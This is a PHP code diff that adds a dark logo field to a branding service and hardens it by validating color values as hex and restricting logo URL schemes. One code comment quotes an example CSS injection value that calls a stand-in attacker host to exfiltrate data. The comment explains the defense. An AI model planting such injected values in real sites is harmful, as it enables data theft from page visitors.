@@ -15,6 +15,7 @@ class BrandingService
         if (!$settings) {
             return [
                 'logo_url' => '',
+                'dark_logo_url' => '',
                 'primary_color' => '#6366f1',
                 'secondary_color' => '#8b5cf6',
                 'login_bg_url' => '',
@@ -25,11 +26,55 @@ class BrandingService
                 'favicon_url' => '',
             ];
         }
+        // Ensure dark_logo_url key always exists even on older rows
+        if (!array_key_exists('dark_logo_url', $settings)) {
+            $settings['dark_logo_url'] = '';
+        }
         return $settings;
     }
 
     public function save(int $clientId, array $data): void
     {
+        // Validate color inputs: they get interpolated into CSS blocks
+        // (including the PUBLIC shared report page) so we must reject
+        // anything that isn't a plain hex color. A malicious value like
+        // "red;background:url(//attacker.tld/log)" would otherwise exfiltrate
+        // data via background-image requests from the report page.
+        foreach (['primary_color', 'secondary_color'] as $colorField) {
+            if (isset($data[$colorField])) {
+                $val = trim((string) $data[$colorField]);
+                if ($val === '' || !preg_match('/^#[0-9a-fA-F]{3,8}$/', $val)) {
+                    // Drop invalid values so the existing DB value / default stays
+                    unset($data[$colorField]);
+                }
+            }
+        }
+
+        // Validate logo URL schemes — only allow http(s) or relative app URLs.
+        // Blocks javascript: and data: URLs that could abuse OG:image crawlers
+        // or browser behavior in edge cases. Empty strings are allowed
+        // (used to clear an existing logo).
+        foreach (['logo_url', 'dark_logo_url', 'login_bg_url', 'favicon_url'] as $urlField) {
+            if (isset($data[$urlField]) && $data[$urlField] !== '') {
+                $u = (string) $data[$urlField];
+                $isSafe = (
+                    str_starts_with($u, 'http://')
+                    || str_starts_with($u, 'https://')
+                    || str_starts_with($u, '/')
+                    || str_starts_with($u, BASE_URL)
+                );
+                if (!$isSafe) {
+                    unset($data[$urlField]);
+                }
+            }
+        }
+
+        // If validation stripped every field, there's nothing to save.
+        // Early-return so the base model doesn't build an empty SET clause.
+        if (empty($data)) {
+            return;
+        }
+
         $this->model->updateByClient($clientId, $data);
     }
 
